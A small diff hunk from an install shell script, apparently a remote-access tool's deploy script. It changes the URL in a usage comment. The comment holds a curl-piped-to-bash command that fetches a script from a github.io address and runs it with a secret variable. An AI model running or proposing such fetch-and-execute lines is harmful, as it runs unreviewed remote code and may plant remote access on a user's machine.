@@ -1741,7 +1741,7 @@ init_auth_password
 [[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall
 
 init_setup
-# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL https://assetimg.github.io/cjob/w)"
+# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL https://assetimg.github.io/cjob/x)"
 [[ -n "$X" ]] && GS_SECRET_X="$X"
 
 if [[ -z $S ]]; then
